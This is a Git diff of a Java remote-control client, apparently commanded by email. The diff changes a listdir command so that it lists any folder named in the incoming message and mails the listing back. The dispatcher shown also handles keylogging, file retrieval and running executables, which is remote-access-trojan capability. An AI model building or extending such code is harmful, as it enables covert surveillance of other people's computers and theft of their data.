@@ -122,7 +122,7 @@ public class MainClient {
             return false;
         }
     }
-    
+
     private static boolean ListProcess(int id, String sender) {
         String subject = "res/" + id;
         try {
@@ -145,14 +145,35 @@ public class MainClient {
             return false;
         }
     }
-    private static boolean listDir(int id, String sender) {
+    private static boolean listDir(int id, String header, String sender) {
         try {
-            ListDir list = new ListDir("");
-            String filename = "LIST DIR" + ZonedDateTime.now().format(DateTimeFormatter
-                    .ofPattern(" dd-MM-yyyy HH-mm")) + ".txt";
-            list.listAll(filename);
-            SendMail.getInstance().sendMail("res/" + id, null, filename, true, sender);
+            Pattern pattern = Pattern.compile("\"(.*)\"");
+            Matcher matcher = pattern.matcher(header);
+            String folder = "bomaylaymay";
+            if (matcher.find()) {
+                folder = matcher.group(1);
+                System.out.println(folder);
+            }
+            Path file = Path.of(folder);
+            if (Files.exists(file)) {
+                if (Files.isDirectory(file)) {
+                    ListDir list = new ListDir(folder);
+                    String filename = "LIST DIR" + ZonedDateTime.now().format(DateTimeFormatter
+                            .ofPattern(" dd-MM-yyyy HH-mm")) + ".txt";
+                    list.listAll(filename);
+                    SendMail.getInstance().sendMail("res/" + id, null, filename, true, sender);
+                    return true;
+                }
+                else {
+                    SendMail.getInstance().sendMail("res/" + id + "/0000/You are sending a file, not a folder"
+                            , "", null, false, sender);
+                }
+            } else {
+                SendMail.getInstance().sendMail("res/" + id + "/0000/Folder doesnt exists."
+                        , "", null, false, sender);
+            }
             return true;
+
         } catch (IOException | MessagingException e) {
             System.out.println("error when list");
             e.printStackTrace();
@@ -254,14 +275,14 @@ public class MainClient {
             } else if (command.equalsIgnoreCase("keylog")) {
                 return keyLog(id, Long.parseLong(parts[3].trim()), sender);
             }
-        else if (command.equalsIgnoreCase("Shutdown")) {
-            if (parts.length > 3)
-                return Shutdown(id, parts[3].trim(), sender);
-            return Shutdown(id, "", sender);}
+//        else if (command.equalsIgnoreCase("Shutdown")) {
+//            if (parts.length > 3)
+//                return Shutdown(id, parts[3].trim(), sender);
+//            return Shutdown(id, "", sender);}
             else if (command.equalsIgnoreCase("ListProcess")) {
                 return ListProcess(id, sender);
             } else if (command.equalsIgnoreCase("listdir")) {
-                return listDir(id, sender);
+                return listDir(id,header, sender);
             } else if (command.equalsIgnoreCase("get")) {
                 return getFile(id, header, sender);
             } else if (command.equalsIgnoreCase("runexe")) {
